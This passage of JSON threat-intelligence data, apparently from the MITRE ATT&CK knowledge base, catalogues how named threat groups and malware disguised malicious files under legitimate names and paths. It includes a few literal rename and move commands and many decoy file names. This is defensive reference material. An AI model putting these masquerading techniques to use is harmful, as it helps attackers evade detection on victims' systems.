                        "Name": "ZIRCONIUM",
                        "Description": "<name> has created a run key named Dropbox Update Setup to mask a persistence mechanism for a malicious binary.[84]"
                    },
                    "S1013": {
                        "ID": "S1013",
                        "Name": "ZxxZ",
                        "Description": "<name> has been disguised as a Windows security update service.[12]"
                    }
                }
            },
            "005": {
                "name": "Match Legitimate Name or Location",
                "href": "/techniques/T1036/005",
                "description": "Adversaries may match or approximate the name or location of legitimate files or resources when naming/placing them. This is done for the sake of evading defenses and observation. This may be done by placing an executable in a commonly trusted directory (ex: under System32) or giving it the name of a legitimate, trusted program (ex: svchost.exe). In containerized environments, this may also be done by creating a resource in a namespace that matches the naming convention of a container pod or cluster. Alternatively, a file or container image name given may be a close approximation to legitimate programs/images or something innocuous.Adversaries may also use the same icon of the file they are trying to mimic.",
                "Procedure": {
                    "C0025": {
                        "ID": "C0025",
                        "Name": "2016 Ukraine Electric Power Attack",
                        "Description": "During the <name>, DLLs and EXEs with filenames associated with common electric power sector protocols were used to masquerade files.[1]"
                    },
                    "G0018": {
                        "ID": "G0018",
                        "Name": "admin@338",
                        "Description": "<name> actors used the following command to rename one of their tools to a benign file name: ren \"%temp%\\upload\" audiodg.exe[2]"
                    },
                    "S1074": {
                        "ID": "S1074",
                        "Name": "ANDROMEDA",
                        "Description": "<name> has been installed to C:\\Temp\\TrustedInstaller.exe to mimic a legitimate Windows installer service.[3]"
                    },
                    "G1007": {
                        "ID": "G1007",
                        "Name": "Aoqin Dragon",
                        "Description": "<name> has used fake icons including antivirus and external drives to disguise malicious payloads.[4]"
                    },
                    "S0622": {
                        "ID": "S0622",
                        "Name": "AppleSeed",
                        "Description": "<name> has the ability to rename its payload to ESTCommon.dll to masquerade as a DLL belonging to ESTsecurity.[5]"
                    },
                    "G0006": {
                        "ID": "G0006",
                        "Name": "APT1",
                        "Description": "The file name AcroRD32.exe, a legitimate process name for Adobe's Acrobat Reader, was used by <name> as a name for malware.[6][7]"
                    },
                    "G0007": {
                        "ID": "G0007",
                        "Name": "APT28",
                        "Description": "<name> has changed extensions on files containing exfiltrated data to make them appear benign, and renamed a web shell instance to appear as a legitimate OWA page.[8]"
                    },
                    "G0016": {
                        "ID": "G0016",
                        "Name": "APT29",
                        "Description": "<name> has renamed malicious DLLs with legitimate names to appear benign; they have also created an Azure AD certificate with a Common Name that matched the display name of the compromised service principal.[9][10]"
                    },
                    "G0050": {
                        "ID": "G0050",
                        "Name": "APT32",
                        "Description": "<name> has renamed a NetCat binary to kb-10233.exe to masquerade as a Windows update. <name> has also renamed a Cobalt Strike beacon payload to install_flashplayers.exe. [11][12]"
                    },
                    "G0087": {
                        "ID": "G0087",
                        "Name": "APT39",
                        "Description": "<name> has used malware disguised as Mozilla Firefox and a tool named mfevtpse.exe to proxy C2 communications, closely mimicking a legitimate McAfee file mfevtps.exe.[13][14]"
                    },
                    "G0096": {
                        "ID": "G0096",
                        "Name": "APT41",
                        "Description": "<name> attempted to masquerade their files as popular anti-virus software.[15][16]"
                    },
                    "G1023": {
                        "ID": "G1023",
                        "Name": "APT5",
                        "Description": "<name> has named exfiltration archives to mimic Windows Updates at times using filenames with a KB<digits>.zip pattern.[17]"
                    },
                    "S0475": {
                        "ID": "S0475",
                        "Name": "BackConfig",
                        "Description": "<name> has hidden malicious payloads in %USERPROFILE%\\Adobe\\Driver\\dwg\\ and mimicked the legitimate DHCP service binary.[18]"
                    },
                    "G0135": {
                        "ID": "G0135",
                        "Name": "BackdoorDiplomacy",
                        "Description": "<name> has dropped implants in folders named for legitimate software.[19]"
                    },
                    "S0606": {
                        "ID": "S0606",
                        "Name": "Bad Rabbit",
                        "Description": "<name> has masqueraded as a Flash Player installer through the executable file install_flash_player.exe.[20][21]"
                    },
                    "S0128": {
                        "ID": "S0128",
                        "Name": "BADNEWS",
                        "Description": "<name> attempts to hide its payloads using legitimate filenames.[22]"
                    },
                    "S0534": {
                        "ID": "S0534",
                        "Name": "Bazar",
                        "Description": "The <name> loader has named malicious shortcuts \"adobe\" and mimicked communications software.[23][24][25]"
                    },
                    "S0268": {
                        "ID": "S0268",
                        "Name": "Bisonal",
                        "Description": "<name> has renamed malicious code to msacm32.dll to hide within a legitimate library; earlier versions were disguised as winhelp.[26]"
                    },
                    "S1070": {
                        "ID": "S1070",
                        "Name": "Black Basta",
                        "Description": "The <name> dropper has mimicked an application for creating USB bootable drivers.[27]"
                    },
                    "S0520": {
                        "ID": "S0520",
                        "Name": "BLINDINGCAN",
                        "Description": "<name> has attempted to hide its payload by using legitimate file names such as \"iconcache.db\".[28]"
                    },
                    "G0108": {
                        "ID": "G0108",
                        "Name": "Blue Mockingbird",
                        "Description": "<name> has masqueraded their XMRIG payload name by naming it wercplsupporte.dll after the legitimate wercplsupport.dll file.[29]"
                    },
                    "G0060": {
                        "ID": "G0060",
                        "Name": "BRONZE BUTLER",
                        "Description": "<name> has given malware the same name as an existing file on the file share server to cause users to unwittingly launch and install the malware on additional systems.[30]"
                    },
                    "S1063": {
                        "ID": "S1063",
                        "Name": "Brute Ratel C4",
                        "Description": "<name> has used a payload file named OneDrive.update to appear benign.[31]"
                    },
                    "S1039": {
                        "ID": "S1039",
                        "Name": "Bumblebee",
                        "Description": "<name> has named component DLLs \"RapportGP.dll\" to match those used by the security company Trusteer.[32]"
                    },
                    "S0482": {
                        "ID": "S0482",
                        "Name": "Bundlore",
                        "Description": "<name> has disguised a malicious .app file as a Flash Player update.[33]"
                    },
                    "C0017": {
                        "ID": "C0017",
                        "Name": "C0017",
                        "Description": "During <name>, APT41 used file names beginning with USERS, SYSUSER, and SYSLOG for DEADEYE, and changed KEYPLUG file extensions from .vmp  to .upx likely to avoid hunting detections.[34]"
                    },
                    "C0018": {
                        "ID": "C0018",
                        "Name": "C0018",
                        "Description": "For <name>, the threat actors renamed a Sliver payload to vmware_kb.exe.[35]"
                    },
                    "C0032": {
                        "ID": "C0032",
                        "Name": "C0032",
                        "Description": "During the <name> campaign, TEMP.Veles renamed files to look like legitimate files, such as Windows update files or Schneider Electric application files.[36]"
                    },
                    "S0274": {
                        "ID": "S0274",
                        "Name": "Calisto",
                        "Description": "<name>'s installation file is an unsigned DMG image under the guise of Intego\u2019s security solution for mac.[37]"
                    },
                    "G0008": {
                        "ID": "G0008",
                        "Name": "Carbanak",
                        "Description": "<name> has named malware \"svchost.exe,\" which is the name of the Windows shared service host program.[38]"
                    },
                    "S0484": {
                        "ID": "S0484",
                        "Name": "Carberp",
                        "Description": "<name> has masqueraded as Windows system file names, as well as \"chkntfs.exe\" and \"syscron.exe\".[39][40]"
                    },
                    "S0631": {
                        "ID": "S0631",
                        "Name": "Chaes",
                        "Description": "<name> has used an unsigned, crafted DLL module named hha.dll that was designed to look like a legitimate 32-bit Windows DLL.[41]"
                    },
                    "S0144": {
                        "ID": "S0144",
                        "Name": "ChChes",
                        "Description": "<name> copies itself to an .exe file with a filename that is likely intended to imitate Norton Antivirus but has several letters reversed (e.g. notron.exe).[42]"
                    },
                    "G0114": {
                        "ID": "G0114",
                        "Name": "Chimera",
                        "Description": "<name> has renamed malware to GoogleUpdate.exe and WinRAR to jucheck.exe, RecordedTV.ms, teredo.tmp, update.exe, and msadcs1.exe.[43]"
                    },
                    "S1041": {
                        "ID": "S1041",
                        "Name": "Chinoxy",
                        "Description": "<name> has used the name eoffice.exe in attempt to appear as a legitimate file.[44]"
                    },
                    "S0625": {
                        "ID": "S0625",
                        "Name": "Cuba",
                        "Description": "<name> has been disguised as legitimate 360 Total Security Antivirus and OpenVPN programs.[45]"
                    },
                    "S0687": {
                        "ID": "S0687",
                        "Name": "Cyclops Blink",
                        "Description": "<name> can rename its running process to [kworker:0/1] to masquerade as a Linux kernel thread. <name> has also named RC scripts used for persistence after WatchGuard artifacts.[46]"
                    },
                    "S1014": {
                        "ID": "S1014",
                        "Name": "DanBot",
                        "Description": "<name> files have been named UltraVNC.exe and WINVNC.exe to appear as legitimate VNC tools.[47]"
                    },
                    "S0334": {
                        "ID": "S0334",
                        "Name": "DarkComet",
                        "Description": "<name> has dropped itself onto victim machines with file names such as WinDefender.Exe and winupdate.exe in an apparent attempt to masquerade as a legitimate file.[48]"
                    },
                    "G0012": {
                        "ID": "G0012",
                        "Name": "Darkhotel",
                        "Description": "<name> has used malware that is disguised as a Secure Shell (SSH) tool.[49]"
                    },
                    "S0187": {
                        "ID": "S0187",
                        "Name": "Daserf",
                        "Description": "<name> uses file and folder names related to legitimate programs in order to blend in, such as HP, Intel, Adobe, and perflogs.[50]"
                    },
                    "S0600": {
                        "ID": "S0600",
                        "Name": "Doki",
                        "Description": "<name> has disguised a file as a Linux kernel module.[51]"
                    },
                    "S0694": {
                        "ID": "S0694",
                        "Name": "DRATzarus",
                        "Description": "<name> has been named Flash.exe, and its dropper has been named IExplorer.[52]"
                    },
                    "S0567": {
                        "ID": "S0567",
                        "Name": "Dtrack",
                        "Description": "One of <name> can hide in replicas of legitimate programs like OllyDbg, 7-Zip, and FileZilla.[53]"
                    },
                    "G1006": {
                        "ID": "G1006",
                        "Name": "Earth Lusca",
                        "Description": "<name> used the command move [file path] c:\\windows\\system32\\spool\\prtprocs\\x64\\spool.dll to move and register a malicious DLL name as a Windows print processor, which eventually was loaded by the Print Spooler service.[54]"
                    },
                    "S0605": {
                        "ID": "S0605",
                        "Name": "EKANS",
                        "Description": "<name> has been disguised as update.exe to appear as a valid executable.[55]"
                    },
                    "S0081": {
                        "ID": "S0081",
                        "Name": "Elise",
                        "Description": "If installing itself as a service fails, <name> instead writes itself as a file named svchost.exe saved in %APPDATA%\\Microsoft\\Network.[56]"
                    },
                    "S0171": {
                        "ID": "S0171",
                        "Name": "Felismus",
                        "Description": "<name> has masqueraded as legitimate Adobe Content Management System files.[57]"
                    },
                    "G0137": {
                        "ID": "G0137",
                        "Name": "Ferocious Kitten",
                        "Description": "<name> has named malicious files update.exe and loaded them into the compromise host's \"Public\" folder.[58]"
                    },
                    "G1016": {
                        "ID": "G1016",
                        "Name": "FIN13",
                        "Description": "<name> has masqueraded WAR files to look like legitimate packages such as, wsexample.war, wsexamples.com, examples.war, and exampl3s.war.[59]"
                    },
                    "G0046": {
                        "ID": "G0046",
                        "Name": "FIN7",
                        "Description": "<name> has attempted to run Darkside ransomware with the filename sleep.exe.[60]"
                    },
                    "S0182": {
                        "ID": "S0182",
                        "Name": "FinFisher",
                        "Description": "<name> renames one of its .dll files to uxtheme.dll in an apparent attempt to masquerade as a legitimate file.[61][62]"
                    },
                    "S0661": {
                        "ID": "S0661",
                        "Name": "FoggyWeb",
                        "Description": "<name> can be disguised as a Visual Studio file such as Windows.Data.TimeZones.zh-PH.pri to evade detection. Also, <name>'s loader can mimic a genuine dll file that carries out the same import functions as the legitimate Windows version.dll file.[63]"
                    },
                    "G0117": {
                        "ID": "G0117",
                        "Name": "Fox Kitten",
                        "Description": "<name> has named binaries and configuration files svhost and dllhost respectively to appear legitimate.[64]"
                    },
                    "S0410": {
                        "ID": "S0410",
                        "Name": "Fysbis",
                        "Description": "<name> has masqueraded as trusted software rsyncd and dbus-inotifier.[65]"
                    },
                    "G0047": {
                        "ID": "G0047",
                        "Name": "Gamaredon Group",
                        "Description": "<name> has used legitimate process names to hide malware including svchosst.[66]"
                    },
                    "S0666": {
                        "ID": "S0666",
                        "Name": "Gelsemium",
                        "Description": "<name> has named malicious binaries serv.exe, winprint.dll, and chrome_elf.dll and has set its persistence in the Registry with the key value Chrome Update to appear legitimate.[67]"
                    },
                    "S0493": {
                        "ID": "S0493",
                        "Name": "GoldenSpy",
                        "Description": "<name>'s setup file installs initial executables under the folder %WinDir%\\System32\\PluginManager.[68]"
                    },
                    "S0588": {
                        "ID": "S0588",
                        "Name": "GoldMax",
                        "Description": "<name> has used filenames that matched the system name, and appeared as a scheduled task impersonating systems management software within the corresponding ProgramData subfolder.[69][70]"
                    },
                    "S0477": {
                        "ID": "S0477",
                        "Name": "Goopy",
                        "Description": "<name> has impersonated the legitimate goopdate.dll, which was dropped on the target system with a legitimate GoogleUpdate.exe.[11]"
                    },
                    "S0531": {
                        "ID": "S0531",
                        "Name": "Grandoreiro",
                        "Description": "<name> has named malicious browser extensions and update files to appear legitimate.[71][72]"
                    },
                    "S0690": {
                        "ID": "S0690",
                        "Name": "Green Lambert",
                        "Description": "<name> has been disguised as a Growl help file.[73][74]"
                    },
                    "S0697": {
                        "ID": "S0697",
                        "Name": "HermeticWiper",
                        "Description": "<name> has used the name postgressql.exe to mask a malicious payload.[75]"
                    },
                    "S0698": {
                        "ID": "S0698",
                        "Name": "HermeticWizard",
                        "Description": "<name> has been named exec_32.dll to mimic a legitimate MS Outlook .dll.[75]"
                    },
                    "S0070": {
                        "ID": "S0070",
                        "Name": "HTTPBrowser",
                        "Description": "<name>'s installer contains a malicious file named navlu.dll to decrypt and run the RAT. navlu.dll is also the name of a legitimate Symantec DLL.[76]"
                    },
                    "S1022": {
                        "ID": "S1022",
                        "Name": "IceApple",
                        "Description": "<name> .NET assemblies have used App_Web_ in their file names to appear legitimate.[77]"
                    },
                    "G0119": {
                        "ID": "G0119",
                        "Name": "Indrik Spider",
                        "Description": "<name> used fake updates for FlashPlayer plugin and Google Chrome as initial infection vectors.[78]"
                    },
                    "S0259": {
                        "ID": "S0259",
                        "Name": "InnaputRAT",
                        "Description": "<name> variants have attempted to appear legitimate by using the file names SafeApp.exe and NeutralApp.exe.[79]"
                    },
                    "S0260": {
                        "ID": "S0260",
                        "Name": "InvisiMole",
                        "Description": "<name> has disguised its droppers as legitimate software or documents, matching their original names and locations, and saved its files as mpr.dll in the Windows folder.[80][81]"
                    },
                    "S0015": {
                        "ID": "S0015",
                        "Name": "Ixeshe",
                        "Description": "<name> has used registry values and file names associated with Adobe software, such as AcroRd32.exe.[82]"
                    },
                    "G0004": {
                        "ID": "G0004",
                        "Name": "Ke3chang",
                        "Description": "<name> has dropped their malware into legitimate installed software paths including: C:\\ProgramFiles\\Realtek\\Audio\\HDA\\AERTSr.exe, C:\\Program Files (x86)\\Foxit Software\\Foxit Reader\\FoxitRdr64.exe, C:\\Program Files (x86)\\Adobe\\Flash Player\\AddIns\\airappinstaller\\airappinstall.exe, and C:\\Program Files (x86)\\Adobe\\Acrobat Reader DC\\Reader\\AcroRd64.exe.[83]"
                    },
                    "S0526": {
                        "ID": "S0526",
                        "Name": "KGH_SPY",
                        "Description": "<name> has masqueraded as a legitimate Windows tool.[84]"
                    },
                    "G0094": {
                        "ID": "G0094",
                        "Name": "Kimsuky",
                        "Description": "<name> has renamed malware to legitimate names such as ESTCommon.dll or patch.dll.[85]"
                    },
                    "S0669": {
                        "ID": "S0669",
                        "Name": "KOCTOPUS",
                        "Description": "<name> has been disguised as legitimate software programs associated with the travel and airline industries.[86]"
                    },
                    "S0356": {
                        "ID": "S0356",
                        "Name": "KONNI",
                        "Description": "<name> has created a shortcut called \"Anti virus service.lnk\" in an apparent attempt to masquerade as a legitimate file.[87]"
                    },
                    "G0032": {
                        "ID": "G0032",
                        "Name": "Lazarus Group",
                        "Description": "<name> has renamed malicious code to disguise it as Microsoft's narrator and other legitimate files.[88][89]"
                    },
                    "S0395": {
                        "ID": "S0395",
                        "Name": "LightNeuron",
                        "Description": "<name> has used filenames associated with Exchange and Outlook for binary and configuration files, such as winmail.dat.[90]"
                    },
                    "S0582": {
                        "ID": "S0582",
                        "Name": "LookBack",
                        "Description": "<name> has a C2 proxy tool that masquerades as GUP.exe, which is software used by Notepad++.[91]"
                    },
                    "G1014": {
                        "ID": "G1014",
                        "Name": "LuminousMoth",
                        "Description": "<name> has disguised their exfiltration malware as ZoomVideoApp.exe.[92]"
                    },
                    "S0409": {
                        "ID": "S0409",
                        "Name": "Machete",
                        "Description": "<name> renamed payloads to masquerade as legitimate Google Chrome, Java, Dropbox, Adobe Reader and Python executables.[93][94]"
                    },
                    "G0095": {
                        "ID": "G0095",
                        "Name": "Machete",
                        "Description": "<name>'s <name> MSI installer has masqueraded as a legitimate Adobe Acrobat Reader installer.[95]"
                    },
                    "G0059": {
                        "ID": "G0059",
                        "Name": "Magic Hound",
                        "Description": "<name> has used dllhost.exe to mask Fast Reverse Proxy (FRP) and MicrosoftOutLookUpdater.exe for Plink.[96][97][98]"
                    },
                    "S0652": {
                        "ID": "S0652",
                        "Name": "MarkiRAT",
                        "Description": "<name> can masquerade as update.exe and svehost.exe; it has also mimicked legitimate Telegram and Chrome files.[58]"
                    },
                    "S0500": {
                        "ID": "S0500",
                        "Name": "MCMD",
                        "Description": "<name> has been named Readme.txt to appear legitimate.[99]"
                    },
                    "S0459": {
                        "ID": "S0459",
                        "Name": "MechaFlounder",
                        "Description": "<name> has been downloaded as a file named lsass.exe, which matches the legitimate Windows file.[100]"
                    },
                    "G0045": {
                        "ID": "G0045",
                        "Name": "menuPass",
                        "Description": "<name> has been seen changing malicious files to appear legitimate.[101]"
                    },
                    "S0455": {
                        "ID": "S0455",
                        "Name": "Metamorfo",
                        "Description": "<name> has disguised an MSI file as the Adobe Acrobat Reader Installer and has masqueraded payloads as OneDrive, WhatsApp, or Spotify, for example.[102][103]"
                    },
                    "S0084": {
                        "ID": "S0084",
                        "Name": "Mis-Type",
                        "Description": "<name> saves itself as a file named msdtc.exe, which is also the name of the legitimate Microsoft Distributed Transaction Coordinator service binary.[104][105]"
                    },
                    "S0083": {
                        "ID": "S0083",
                        "Name": "Misdat",
                        "Description": "<name> saves itself as a file named msdtc.exe, which is also the name of the legitimate Microsoft Distributed Transaction Coordinator service binary.[104][105]"
                    },
                    "G0069": {
                        "ID": "G0069",
                        "Name": "MuddyWater",
                        "Description": "<name> has disguised malicious executables and used filenames and Registry key names associated with Windows Defender.[106][107][108]"
                    },
                    "G0129": {
                        "ID": "G0129",
                        "Name": "Mustang Panda",
                        "Description": "<name> has used names like adobeupdate.dat and PotPlayerDB.dat to disguise PlugX, and a file named OneDrive.exe to load a Cobalt Strike payload.[109]"
                    },
                    "G1020": {
                        "ID": "G1020",
                        "Name": "Mustard Tempest",
                        "Description": "<name> has used the filename AutoUpdater.js to mimic legitimate update files and has also used the Cyrillic homoglyph characters \u0421 (0xd0a1) and \u0430 (0xd0b0), to produce the filename \u0421hrome.Upd\u0430te.zip.[110][111]"
                    },
                    "G0019": {
                        "ID": "G0019",
                        "Name": "Naikon",
                        "Description": "<name> has disguised malicious programs as Google Chrome, Adobe, and VMware executables.[112]"
                    },
                    "S0630": {
                        "ID": "S0630",
                        "Name": "Nebulae",
                        "Description": "<name> uses functions named StartUserModeBrowserInjection and StopUserModeBrowserInjection indicating that it's trying to imitate chrome_frame_helper.dll.[112]"
                    },
                    "S0198": {
                        "ID": "S0198",
                        "Name": "NETWIRE",
                        "Description": "<name> has masqueraded as legitimate software including TeamViewer and macOS Finder.[113]"
                    },
                    "S1090": {
                        "ID": "S1090",
                        "Name": "NightClub",
                        "Description": "<name> has chosen file names to appear legitimate including EsetUpdate-0117583943.exe for its dropper.[114]"
                    },
                    "S1100": {
                        "ID": "S1100",
                        "Name": "Ninja",
                        "Description": "<name> has used legitimate looking filenames for its loader including update.dll and x64.dll.[115]"
                    },
                    "S0353": {
                        "ID": "S0353",
                        "Name": "NOKKI",
                        "Description": "<name> is written to %LOCALAPPDATA%\\MicroSoft Updatea\\svServiceUpdate.exe prior being executed in a new process in an apparent attempt to masquerade as a legitimate folder and file.[116]"
                    },
                    "S0340": {
                        "ID": "S0340",
                        "Name": "Octopus",
                        "Description": "<name> has been disguised as legitimate programs, such as Java and Telegram Messenger.[117][118]"
                    },
                    "S0138": {
                        "ID": "S0138",
                        "Name": "OLDBAIT",
                        "Description": "<name> installs itself in %ALLUSERPROFILE%\\Application Data\\Microsoft\\MediaPlayer\\updatewindws.exe; the directory name is missing a space and the file name is missing the letter \"o.\"[119]"
                    },
                    "C0012": {
                        "ID": "C0012",
                        "Name": "Operation CuckooBees",
                        "Description": "During <name>, the threat actors renamed a malicious executable to rundll32.exe to allow it to blend in with other Windows system files.[120]"
                    },
                    "C0006": {
                        "ID": "C0006",
                        "Name": "Operation Honeybee",
                        "Description": "During <name>, the threat actors used a legitimate Windows executable and secure directory for their payloads to bypass UAC.[121]"
                    },
                    "C0013": {
                        "ID": "C0013",
                        "Name": "Operation Sharpshooter",
                        "Description": "During <name>, threat actors installed Rising Sun in the Startup folder and disguised it as mssync.exe.[122]"
                    },
                    "C0014": {
                        "ID": "C0014",
                        "Name": "Operation Wocao",
                        "Description": "During <name>, the threat actors renamed some tools and executables to appear as legitimate programs.[123]"
                    },
                    "S0402": {
                        "ID": "S0402",
                        "Name": "OSX/Shlayer",
                        "Description": "<name> can masquerade as a Flash Player update.[124][125]"
                    },
                    "S0072": {
                        "ID": "S0072",
                        "Name": "OwaAuth",
                        "Description": "<name> uses the filename owaauth.dll, which is a legitimate file that normally resides in %ProgramFiles%\\Microsoft\\Exchange Server\\ClientAccess\\Owa\\Auth\\; the malicious file by the same name is saved in %ProgramFiles%\\Microsoft\\Exchange Server\\ClientAccess\\Owa\\bin\\.[126]"
                    },
                    "G0040": {
                        "ID": "G0040",
                        "Name": "Patchwork",
                        "Description": "<name> installed its payload in the startup programs folder as \"Baidu Software Update.\" The group also adds its second stage payload to the startup programs as \"Net Monitor.\"[127] They have also dropped QuasarRAT binaries as files named microsoft_network.exe and crome.exe.[128]"
                    },
                    "S1050": {
                        "ID": "S1050",
                        "Name": "PcShare",
                        "Description": "<name> has been named wuauclt.exe to appear as the legitimate Windows Update AutoUpdate Client.[44]"
                    },
                    "S0587": {
                        "ID": "S0587",
                        "Name": "Penquin",
                        "Description": "<name> has mimicked the Cron binary to hide itself on compromised systems.[129]"
                    },
                    "S0501": {
                        "ID": "S0501",
                        "Name": "PipeMon",
                        "Description": "<name> modules are stored on disk with seemingly benign names including use of a file extension associated with a popular word processor.[130]"
                    },
                    "S0013": {
                        "ID": "S0013",
                        "Name": "PlugX",
                        "Description": "<name> has been disguised as legitimate Adobe and PotPlayer files.[131]"
                    },
                    "S0453": {
                        "ID": "S0453",
                        "Name": "Pony",
                        "Description": "<name> has used the Adobe Reader icon for the downloaded file to look more trustworthy.[132]"
                    },
                    "G0033": {
                        "ID": "G0033",
                        "Name": "Poseidon Group",
                        "Description": "<name> tools attempt to spoof anti-virus processes as a means of self-defense.[133]"
                    },
                    "S1046": {
                        "ID": "S1046",
                        "Name": "PowGoop",
                        "Description": "<name> has used a DLL named Goopdate.dll to impersonate a legitimate Google update file.[134]"
                    },
                    "G0056": {
                        "ID": "G0056",
                        "Name": "PROMETHIUM",
                        "Description": "<name> has disguised malicious installer files by bundling them with legitimate software installers.[135][136]"
                    },
                    "S0196": {
                        "ID": "S0196",
                        "Name": "PUNCHBUGGY",
                        "Description": "<name> mimics filenames from %SYSTEM%\\System32 to hide DLLs in %WINDIR% and/or %TEMP%.[137][138]"
                    },
                    "S1032": {
                        "ID": "S1032",
                        "Name": "PyDCrypt",
                        "Description": "<name> has dropped DCSrv under the svchost.exe name to disk.[139]"
                    },
                    "S0583": {
                        "ID": "S0583",
                        "Name": "Pysa",
                        "Description": "<name> has executed a malicious executable by naming it svchost.exe.[140]"
                    },
                    "S0269": {
                        "ID": "S0269",
                        "Name": "QUADAGENT",
                        "Description": "<name> used the PowerShell filenames Office365DCOMCheck.ps1 and SystemDiskClean.ps1.[141]"
                    },
                    "S1084": {
                        "ID": "S1084",
                        "Name": "QUIETEXIT",
                        "Description": "<name> has attempted to change its name to cron upon startup. During incident response, <name> samples have been identified that were renamed to blend in with other legitimate files.[142]"
                    },
                    "S0565": {
                        "ID": "S0565",
                        "Name": "Raindrop",
                        "Description": "<name> was installed under names that resembled legitimate Windows file and directory names.[143][144]"
                    },
                    "S0629": {
                        "ID": "S0629",
                        "Name": "RainyDay",
                        "Description": "<name> has used names to mimic legitimate software including \"vmtoolsd.exe\" to spoof Vmtools.[112]"
                    },
                    "S0458": {
                        "ID": "S0458",
                        "Name": "Ramsay",
                        "Description": "<name> has masqueraded as a 7zip installer.[145][146]"
                    },
                    "S0495": {
                        "ID": "S0495",
                        "Name": "RDAT",
                        "Description": "<name> has masqueraded as VMware.exe.[147]"
                    },
                    "S0125": {
                        "ID": "S0125",
                        "Name": "Remsec",
                        "Description": "The <name> loader implements itself with the name Security Support Provider, a legitimate Windows function. Various <name> .exe files mimic legitimate file names used by Microsoft, Symantec, Kaspersky, Hewlett-Packard, and VMWare. <name> also disguised malicious modules using similar filenames as custom network encryption software on victims.[148][149]"
                    },
                    "S0496": {
                        "ID": "S0496",
                        "Name": "REvil",
                        "Description": "<name> can mimic the names of known executables.[150]"
                    },
                    "G0106": {
                        "ID": "G0106",
                        "Name": "Rocke",
                        "Description": "<name> has used shell scripts which download mining executables and saves them with the filename \"java\".[151]"
                    },
                    "S1078": {
                        "ID": "S1078",
                        "Name": "RotaJakiro",
                        "Description": "<name> has used the filename systemd-daemon in an attempt to appear legitimate.[152]"
                    },
                    "S0446": {
                        "ID": "S0446",
                        "Name": "Ryuk",
                        "Description": "<name> has constructed legitimate appearing installation folder paths by calling GetWindowsDirectoryW and then inserting a null byte at the fourth character of the path. For Windows Vista or higher, the path would appear as C:\\Users\\Public.[153]"
                    },
                    "S0085": {
                        "ID": "S0085",
                        "Name": "S-Type",
                        "Description": "<name> may save itself as a file named msdtc.exe, which is also the name of the legitimate Microsoft Distributed Transaction Coordinator service binary.[104][105]"
                    },
                    "S1018": {
                        "ID": "S1018",
                        "Name": "Saint Bot",
                        "Description": "<name> has been disguised as a legitimate executable, including as Windows SDK.[154]"
                    },
                    "S1099": {
                        "ID": "S1099",
                        "Name": "Samurai",
                        "Description": "<name> has created the directory %COMMONPROGRAMFILES%\\Microsoft Shared\\wmi\\ to contain DLLs for loading successive stages.[155]"
                    },
                    "G0034": {
                        "ID": "G0034",
                        "Name": "Sandworm Team",
                        "Description": "<name> has avoided detection by naming a malicious binary explorer.exe.[156][157]"
                    },
                    "S1019": {
                        "ID": "S1019",
                        "Name": "Shark",
                        "Description": "<name> binaries have been named audioddg.pdb and Winlangdb.pdb in order to appear legitimate.[47]"
                    },
                    "S0445": {
                        "ID": "S0445",
                        "Name": "ShimRatReporter",
                        "Description": "<name> spoofed itself as AlphaZawgyl_font.exe, a specialized Unicode font.[158]"
                    },
                    "S0589": {
                        "ID": "S0589",
                        "Name": "Sibot",
                        "Description": "<name> has downloaded a DLL to the C:\\windows\\system32\\drivers\\ folder and renamed it with a .sys extension.[69]"
                    },
                    "G1008": {
                        "ID": "G1008",
                        "Name": "SideCopy",
                        "Description": "<name> has used a legitimate DLL file name, Duser.dll to disguise a malicious remote access tool.[159]"
                    },
                    "G0121": {
                        "ID": "G0121",
                        "Name": "Sidewinder",
                        "Description": "<name> has named malicious files rekeywiz.exe to match the name of a legitimate Windows executable.[160]"
                    },
                    "G0091": {
                        "ID": "G0091",
                        "Name": "Silence",
                        "Description": "<name> has named its backdoor \"WINWORD.exe\".[161]"
                    },
                    "S0468": {
                        "ID": "S0468",
                        "Name": "Skidmap",
                        "Description": "<name> has created a fake rm binary to replace the legitimate Linux binary.[162]"
                    },
                    "S0533": {
                        "ID": "S0533",
                        "Name": "SLOTHFULMEDIA",
                        "Description": "<name> has mimicked the names of known executables, such as mediaplayer.exe.[163]"
                    },
                    "S1035": {
                        "ID": "S1035",
                        "Name": "Small Sieve",
                        "Description": "<name> can use variations of Microsoft and Outlook spellings, such as \"Microsift\", in its file names to avoid detection.[164]"
                    },
                    "S1124": {
                        "ID": "S1124",
                        "Name": "SocGholish",
                        "Description": "<name> has been named AutoUpdater.js to mimic legitimate update files.[111]"
                    },
                    "C0024": {
                        "ID": "C0024",
                        "Name": "SolarWinds Compromise",
                        "Description": "During the <name>, APT29 renamed software and DLLs with legitimate names to appear benign.[165][166]"
                    },
                    "G0054": {
                        "ID": "G0054",
                        "Name": "Sowbug",
                        "Description": "<name> named its tools to masquerade as Windows or Adobe Reader software, such as by using the file name adobecms.exe and the directory CSIDL_APPDATA\\microsoft\\security.[167]"
                    },
                    "S0058": {
                        "ID": "S0058",
                        "Name": "SslMM",
                        "Description": "To establish persistence, <name> identifies the Start Menu Startup directory and drops a link to its own executable disguised as an \"Office Start,\" \"Yahoo Talk,\" \"MSN Gaming Z0ne,\" or \"MSN Talk\" shortcut.[168]"
                    },
                    "S0188": {
                        "ID": "S0188",
                        "Name": "Starloader",
                        "Description": "<name> has masqueraded as legitimate software update packages such as Adobe Acrobat Reader and Intel.[167]"
                    },
                    "S1034": {
                        "ID": "S1034",
                        "Name": "StrifeWater",
                        "Description": "<name> has been named calc.exe to appear as a legitimate calculator program.[169]"
                    },
                    "S0491": {
                        "ID": "S0491",
                        "Name": "StrongPity",
                        "Description": "<name> has been bundled with legitimate software installation files for disguise.[135]"
                    },
                    "S1042": {
                        "ID": "S1042",
                        "Name": "SUGARDUMP",
                        "Description": "<name> has been named CrashReporter.exe to appear as a legitimate Mozilla executable.[170]"
                    },
                    "S0559": {
                        "ID": "S0559",
                        "Name": "SUNBURST",
                        "Description": "<name> created VBScripts that were named after existing services or folders to blend into legitimate activities.[144]"
                    },
                    "S0562": {
                        "ID": "S0562",
                        "Name": "SUNSPOT",
                        "Description": "<name> was identified on disk with a filename of taskhostsvc.exe and it created an encrypted log file at C:\\Windows\\Temp\\vmware-vmdmp.log.[171]"
                    },
                    "S0578": {
                        "ID": "S0578",
                        "Name": "SUPERNOVA",
                        "Description": "<name> has masqueraded as a legitimate SolarWinds DLL.[172][173]"
                    },
                    "G1018": {
                        "ID": "G1018",
                        "Name": "TA2541",
                        "Description": "<name> has used file names to mimic legitimate Windows files or system functionality.[174]"
                    },
                    "S0586": {
                        "ID": "S0586",
                        "Name": "TAINTEDSCRIBE",
